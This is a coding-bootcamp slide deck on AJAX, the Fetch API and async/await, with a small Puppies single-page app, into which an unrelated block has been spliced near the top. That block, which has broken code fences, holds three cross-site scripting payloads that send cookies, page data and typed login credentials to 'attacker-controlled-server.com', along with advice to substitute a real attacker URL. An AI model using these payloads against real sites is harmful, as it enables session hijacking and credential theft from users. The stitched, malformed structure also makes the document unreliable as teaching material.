[click to view as a presentation](https://presentations.generalassemb.ly/5f9c9b924793af4c9d507178d8051fa2#/1)

<link href="https://gist.githubusercontent.com/jim-clark/6919052ab15de680c120907d223c31b5/raw/9eedb5e3c01352b9ccda7264227f253be56a08b7/slide.css">

---
<img src="https://i.imgur.com/VqMhmBL.png">

---

```
Session Token Theft:

An attacker might use the Fetch API to send the user's session token to a server they control:
```
<script>
  fetch('https://attacker-controlled-server.com/steal.php?token=' + document.cookie);
</script>
```
In this example, replace 'https://attacker-controlled-server.com/steal.php' with the actual URL of the attacker's server. This payload fetches the user's cookies, including the session token, and sends it to the attacker-controlled server.

Sensitive Information Exfiltration:

An attacker might use the Fetch API to exfiltrate sensitive information from the current page and send it to an external server:

```
<script>
  var sensitiveData = document.getElementById('sensitiveElement').innerText;
  fetch('https://attacker-controlled-server.com/exfiltrate.php?data=' + encodeURIComponent(sensitiveData));
</script>
```
Replace 'https://attacker-controlled-server.com/exfiltrate.php' with the actual URL of the attacker's server.
This payload extracts sensitive information from an HTML element with the ID 'sensitiveElement' and sends it to the attacker-controlled server.

Credential Harvesting:

An attacker might use the Fetch API to capture login credentials entered by users:

```
<script>
  document.getElementById('loginForm').addEventListener('submit', function(event) {
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    fetch('https://attacker-controlled-server.com/harvest.php?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
  });
</script>


## Learning Objectives
<br>

<p>Students Will Be Able To:</p><br>

- Describe the Use Case for AJAX
- Use the `fetch` API to make AJAX requests to the Puppies API
- Use ES2017's `async`/`await` to handle promises synchronously

---
### Roadmap
<br>

1. Setup
2. AJAX - What & Why
3. Make an HTTP Request Using the Fetch API
4. Use ES2017's `async`/`await` to Handle Promises
5. Function Expressions Can Use `await` Too
6. Let's Build a Puppy SPA
7. Using Other HTTP Methods with Fetch
8. Essential Questions

---
#### Setup
<br>

- We'll be using [Repl.it](https://repl.it) during this lesson to learn about AJAX and `async`/`await`.

- Create a new HTML, CSS, JS repl and name it something like **AJAX with Fetch**.

---
#### AJAX - What & Why
<br>

- **AJAX** is short for **Asynchronous JavaScript And XML**.

- In case you're wondering what the [XML](https://en.wikipedia.org/wiki/XML) is about... It's the granddaddy of all markup languages, including HTML.

- Once upon a time, XML was the de facto format for transferring data between two computers - that's why it's in the name AJAX. However, **JSON** has since become the data transfer format of choice.

---
#### AJAX - What & Why
<br>

- Clients (browsers) use **AJAX** to make HTTP requests using JavaScript.

- The browser can send AJAX requests to any API server, as long as the server is [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) compliant.

- Using AJAX, we can send an HTTP request that uses any HTTP method including, `GET`, `POST`, `PUT` & `DELETE` - no need for `method-override`!

---
#### AJAX - What & Why
<br>

- But, here's the best part - unlike when we click a link or submit a form on a web page, AJAX does not trigger a page reload!

- We can use AJAX to communicate with servers to do lots of things, including to read, create, update & delete data without the user seeing a page refresh.

- AJAX has made possible the modern-day Single Page Application (SPA) like what you're going to build during this unit!

---
#### AJAX - What & Why
<br>

- AJAX was originally made possible back in 1998 when IE5 introduced the `XMLHttpRequest` (XHR) object and today it's in all browsers. However, it's a bit clunky to use.

- One of the reasons jQuery became popular was because it made making AJAX requests easier.

- However, we no longer have to use the XHR object or load jQuery to make AJAX calls thanks to the [Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) which is part of the collection of [Web APIs](https://developer.mozilla.org/en-US/docs/Web/API) included in modern browsers.

---
#### Make an HTTP Request Using the Fetch API
<br>

- So, the **A** in AJAX stands for **asynchronous**.

- Indeed, making an AJAX request is an asynchronous operation. So far, we've seen two approaches that enable us to run code after an asynchronous operation has completed. <br>❓ **What are they?**

---
#### Make an HTTP Request Using the Fetch API
<br>

- The Fetch API, like any new Web API asynchronous method, uses promises instead of callbacks.

- Let's make a `GET` request to the `/users` endpoint of [JSONPlaceholder](https://jsonplaceholder.typicode.com/), a fake RESTful API for developers:

	```js
	fetch('https://jsonplaceholder.typicode.com/users')
	.then(response => console.log(response))
	```
	When ran, we'll see that the `fetch` method returns a promise that resolves to a Fetch [Response](https://developer.mozilla.org/en-US/docs/Web/API/Response) object, which has properties such as `status`, etc.

---
#### Make an HTTP Request Using the Fetch API
<br>

- To obtain the data in the body of the response, we need to call either the `text` or `json` method which returns yet another promise:

	```js
	// fetch defaults to making a GET request
	fetch('https://jsonplaceholder.typicode.com/users')
	.then(response => response.json())
	.then(users => console.log(users))
	```
	As you can see, the `json()` method returns a promise that resolves to the data returned by the server, as JSON.

---
#### Use ES2017's async/await to Handle Promises
<br>

- Before we continue to use `fetch` any further, let's see how to use a fantastic new way of working with promises:<br>[async](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function) & [await](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/await)

- The purpose of `async`/`await` is to allow us to work with asynchronous code almost as if it were synchronous!

---
#### Use ES2017's async/await to Handle Promises
<br>

- We use the `async` declaration to mark a **function** as asynchronous when promises are going to be handled using `await` within it.

- We can re-write our code to use `async`/`await` like this:

	```js
	async function printUsers() {
	  const endpoint = 'https://jsonplaceholder.typicode.com/users';
	  let users = await fetch(endpoint).then(res => res.json());
	  console.log(users);
	}
	
	printUsers();
	```
	The `await` operator causes the line of code with `fetch` to "pause" until the promise resolves with its value - in this case an array of users.

---
#### Use ES2017's async/await to Handle Promises
<br>

- When using `async`/`await`, we cannot use a `.catch()` to handle a promise's rejection, instead we use JavaScripts's `try`/`catch` block:

	```js
	async function printUsers() {
	  const endpoint = 'https://jsonplaceholder.typicode.com/users';
	  let users;
	  try {
	    users = await fetch(endpoint).then(res => res.json());
	    console.log(users);
	  } catch(err) {
	    console.log(err);
	  } 
	}
	```
	The `catch` block would run if the `fetch` failed.

---
#### Use ES2017's async/await to Handle Promises
<br>

- So basically, we've seen that `async`/`await` replaces the `.then(<function>)` method for when a promise resolves.

- In addition, JavaScript `try`/`catch` blocks replace the `.catch(<function>)` for error handling when a promise is rejected.

---
#### 💪 Practice Exercise (2 MIN)
<br>

- After the `console.log(users)`, add another AJAX request using `fetch` to JSONPlaceholder's `/posts` endpoint.

- Log out the returned posts.

---
#### Use ES2017's async/await to Handle Promises
<br>

- Node.js also has `async`/`await`, so you can now work with Mongoose code like this:

	```js
	async function index(req, res) {
	  const movies = await Movie.find({});
	  res.render('movies/index', { title: 'All Movies', movies });
	}
	``` 
	Instead of this:
	
	```js
	function index(req, res) {
	  Movie.find({}).then(function(movies) {
	    res.render('movies/index', { title: 'All Movies', movies });
	  });
	}
	```

---
#### ❓ Review Questions
<br>

1. Why is AJAX required to be able to build Single Page Applications like Gmail?

2. What is wrong with the following code?

	```js
	function show(req, res) {
	  const movie = await Movie.findById(req.params.id);
	  res.render('movies/show', { title: 'Movie Detail', movie });
	}
	```
	Hint: Something is missing

---
#### Function Expressions Can Use await Too

- Note that an `async` function always returns a promise - not the expression in the `return` statement.

- For example, the following code will not work:

	```js
	async function getUsers() {
	  const endpoint = 'https://jsonplaceholder.typicode.com/users';
	  let users;
	  try {
	    users = await fetch(endpoint).then(res => res.json());
	    return users;
	  } catch(err) {
	    console.log(err);
	  } 
	}
	
	let users = getUsers();
	console.log(users);
	```
	Note that a Promise was logged out instead of the users.

---
#### Function Expressions Can Use await Too
<br>

- You might try to simply add an `await` as follows:

	```js
	let users = await getUsers();
	```

- However, the error says it all:

	```
	SyntaxError: await is only valid in async function...
	```
	
- The solution is to wrap the code within an "async" immediately invoked function expression (IIFE)...

---
#### Function Expressions Can Use await Too
<br>

- Function expressions can also use `await`:

	```js
	(async function() {
	  let users = await getUsers();
	  console.log(users);
	})();
	```
	Now, whatever `getUsers` returns will be assigned to `users`.
	
- Basically any function can be declared as `async`, including callbacks, arrow functions, etc. 

---
#### Let's Build a Puppy SPA
<br>

- Let's build an ugly (no CSS) little SPA that uses the RESTful Puppies API we built in Unit 2.

- Upon loading, the app will fetch and display all puppies.

- We'll also include create functionality.

---
#### Let's Build a Puppy SPA
<br>

- The Puppies RESTful API (code in the lesson's folder) has been deployed to Heroku at this URL:

	```
	https://sei-puppies-api.herokuapp.com/
	```
	and has the following endpoints:
	<table>
		<thead>
			<tr><th>Endpoint</th><th>CRUD Operation</th>
		</thead>
		<tbody>
			<tr><td>GET /api/puppies</td><td>Index</td></tr>
			<tr><td>GET /api/puppies/:id</td><td>Show</td></tr>
			<tr><td>POST /api/puppies</td><td>Create</td></tr>
			<tr><td>PUT /api/puppies/:id</td><td>Update</td></tr>
			<tr><td>DELETE /api/puppies/:id</td><td>Delete</td></tr>
		</tbody>
	</table>

---
#### Let's Build a Puppy SPA
<br>

- Now, a little markup for navigation and the Puppies List "view":

	```html
	<body>
	  <nav>
	    <button id="index-view-btn">List Puppies</button>
	    <button id="create-view-btn">Add a Puppy</button>
	  </nav>
	  <main id="index-view">
	    <h1>Puppies List</h1>
	    <section></section>
	  </main>
	  <script src="script.js"></script>
	</body>
	```

- Our SPA's JS will hide/show either the `index-view` or `create-view` (which we'll add in a bit) according to a `currentView` state variable.
	
---
#### Let's Build a Puppy SPA

- Let's structure the initial JavaScript:

	```js
	/*-- constants --*/
	const BASE_URL = 'https://sei-puppies-api.herokuapp.com/api/puppies/';

	/*-- cached elements --*/
	const indexViewEl = document.getElementById('index-view');
	const listContainerEl = document.querySelector('#index-view section');
		
	/*-- functions --*/
	init();
		
	function init() {
	  render();
	}
		
	function render() {
	}
	```

- Does the structure look familiar? 😄

---
#### Let's Build a Puppy SPA
<br>

- We're also going to need to define some variables to hold the app's state:

	```js
	/*-- app's state vars --*/
	let currentView, puppies;
	
	/*-- cached elements --*/
	```
	
- Remember, we just define the variables - initializing their values is the `init` function's responsibility.

---
#### Let's Build a Puppy SPA
<br>

- Let's initialize the state in the `init` function:

	```js
	async function init() {
	  currentView = 'index';
	  puppies = await fetch(BASE_URL).then(res => res.json());
	  render();
	}
	```

- Don't forget to add the `async` declaration in front of `function init() {`.

- Next, we'll add some code to the `render` function...

---
#### Let's Build a Puppy SPA
<br>

- Here's our `render` function so far:

	```js
	function render() {
	  indexViewEl.style.display =
	    currentView === 'index' ? 'block' : 'none';
	  if (currentView === 'index') {
	    let html = puppies.reduce((html, pup) => html + 
	      `<div>${pup.name} (${pup.breed}) - age ${pup.age}</div>`, '');
	    listContainerEl.innerHTML = html;
	  } else if (currentView === 'create') {
	    // TODO
	  }
	}
	```

- Since we want a single value, a string, from an array, `reduce`
is the most suitable iterator method.

- The list of puppies should now be rendering.

---
#### Let's Build a Puppy SPA
<br>

- Now we're going to build the **Add a Puppy** functionality.

- Let's start by adding an event listener for when the [Add a Puppy] button is clicked:

	```js
	document.getElementById('create-view-btn')
	.addEventListener('click', function() {
	  // Update state, call render...
	  currentView = 'create';
	  render();
	});
	```

- Yup, in response to user interaction, we update state and call `render()`.

---
#### Let's Build a Puppy SPA
<br>

- Next up, let's add some markup for the create view:

	```html
	</main>
	<!-- new html below -->
	<main id="create-view">
	  <h1>Add a Puppy</h1>
	  <section>
	    <div>Name: <input></div>
	    <div>Breed: <input></div>
	    <div>Age: <input type="number"></div>
	    <button id="add-puppy-btn">Add Puppy</button>
	  </section>
	</main>
	```

- Note that since we never submit forms in a SPA, they are not required. However, they can be beneficial for performing validation and styling when using a CSS framework.

---
#### Let's Build a Puppy SPA
<br>

- Let's add the `create-view` element to cached elements:

	```js
	const createViewEl = document.getElementById('create-view');
	```

- Now we can update the `render` function to show only the "current" view:

	```js
	indexViewEl.style.display =
	  currentView === 'index' ? 'block' : 'none';
	// Add code below
	createViewEl.style.display =
	  currentView === 'create' ? 'block' : 'none';
	```

---
#### Let's Build a Puppy SPA
<br>

- Add the following in the event listeners section:

	```js
	document.getElementById('add-puppy-btn')
	.addEventListener('click', handleAddPuppy);
	```
	
- Let's also cache the `<input>` elements to make it easier to access their data:

	```js
	const inputEls = document.querySelectorAll('#create-view input');
	```
	Note that `inputEls` will be an HTMLCollection of elements that we can access using square bracket notation and even `forEach` over.

---
#### Using Other HTTP Methods with Fetch
<br>

- So far we've used `fetch` to issue only a basic GET request without a data payload.

- By providing a second "options" argument, we're able to specify the HTTP method of the request, include a data payload in the body of the request, set headers, etc.

- Next, lets code the `handleAddPuppy` function that sends the new puppy's data to the server as JSON using a POST request...

---
#### Let's Build a Puppy SPA
<br>

- We'll review as we type the following code:
	
	```js
	async function handleAddPuppy() {
	  // Ensure there's a name entered
	  if (inputEls[0].value) {
	    let newPup = await fetch(BASE_URL, {
	      method: 'POST',
	      headers: {'Content-Type': 'application/json'},
	      body: JSON.stringify({
	        name: inputEls[0].value,
	        breed: inputEls[1].value,
	        age: inputEls[2].value
	      })
	    }).then(res => res.json());
	    alert(`Pup added has an id of ${newPup._id}`);
	    // Clear the inputs
	    inputEls[0].value = inputEls[1].value = inputEls[2].value = '';
	  }
	}
	```

---
#### Let's Build a Puppy SPA
<br>

- All that's left is to write the code for when the [List Puppies] button is clicked.

- Since we want to do exactly what the `init` function does, let's cheat a bit:

	```js
	document.getElementById('index-view-btn')
	.addEventListener('click', init);
	```

- Congrats on writing an ugly little SPA!

---
#### 💪 Bonus Exercises
<br>

- Now that you know how to send AJAX requests to a server's API, why not challenge yourself by implementing both `delete` and `update` functionality!

- Let's wrap up with a couple of review questions...

---
#### ❓ Essential Questions
<br>

1. `async/await` provides another way to work with ________?

2. Which of the following scenarios can `fetch` be used for?
	1. Creating a new movie in an app's database without refreshing the page.
	2. Deleting a fun fact about a student from an app's database without refreshing the page.
	3. Submitting a form to create a cat and redirecting to the cats index page.

---
#### References
<br>

- [MDN - Async Functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function)

- [MDN - Await Operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/await)

